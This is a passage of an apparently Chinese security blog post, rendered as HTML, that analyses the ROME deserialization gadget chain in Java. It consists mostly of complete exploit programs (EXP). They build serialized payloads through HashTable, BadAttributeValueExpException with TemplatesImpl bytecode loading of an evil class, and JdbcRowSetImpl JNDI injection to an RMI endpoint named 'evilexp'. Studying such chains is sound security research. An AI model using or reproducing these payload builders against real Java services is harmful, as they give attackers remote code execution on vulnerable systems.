class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="HashTable-替换-HashMap"><a href="#HashTable-替换-HashMap" class="headerlink" title="HashTable 替换 HashMap"></a>HashTable 替换 HashMap</h3><p>在 <code>HashTable</code> 里面，对于 <code>HashTable</code> 中的每个元素，都会调用 <code>reconstitutionPut()</code> 方法,在<code>reconstitutionPut()</code> 方法中会调用键的hashcode函数，后续和HashMap一样了。不过不需要替换objectBean里面_equalsBean了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(objectBean,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line">serialize(hashtable);</span><br></pre></td></tr></table></figure>
+
+<h3 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h3><p>BadAttributeValueExpException#readObject()中会调用toString方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个BadAttributeValueExpException类，将其val属性设置为构造的toStringBean即可。当然要用反射来设置，因为在构造函数中，赋值val前会把我们传入的toStringBean调用toString，那么我们就无法正常接下来的序列化恶意类了。</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME_BadAttributeValueExpException_EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\asus\\Desktop\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcode = &#123;evil&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,evilcode);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>Fastjson中常出现的JdbcRowSetImpl的JNDI注入。</p>
+<p><img src="/./images/image-20240713032003465.png" alt="image-20240713032003465"></p>
+<h4 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject -&gt; ObjectBean#hashCode() -&gt; EqualsBean#beanHashCode -&gt; ToStringBean#toString() -&gt; ToStringBean#toString(String) -&gt; JdbcRowSetImpl#getDatabaseMetaData()</span><br></pre></td></tr></table></figure>
+
+<p>可以写个小demo体会一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/evilexp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(jdbcRowSet.getClass(), jdbcRowSet);</span><br><span class="line"></span><br><span class="line">        toStringBean.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME_JdbcRowSet_EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/evilexp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(jdbcRowSet.getClass(), jdbcRowSet);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">equalsBean</span> <span class="operator">=</span> objectBean.getClass().getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.set(objectBean,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(toStringBean.getClass(),toStringBean));</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">ROME链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">ROME反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.4.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-%E6%9B%BF%E6%8D%A2-HashMap"><span class="toc-number">1.4.1.</span> <span class="toc-text">HashTable 替换 HashMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">BadAttributeValueExpException利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.3.</span> <span class="toc-text">JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/13/ROME%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/13/ROME%E9%93%BE/&text=ROME链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/13/ROME%E9%93%BE/&is_video=false&description=ROME链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROME链&body=Check out this article: http://example.com/2024/07/13/ROME%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/13/ROME%E9%93%BE/&name=ROME链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/13/ROME%E9%93%BE/&t=ROME链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        John Doe
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
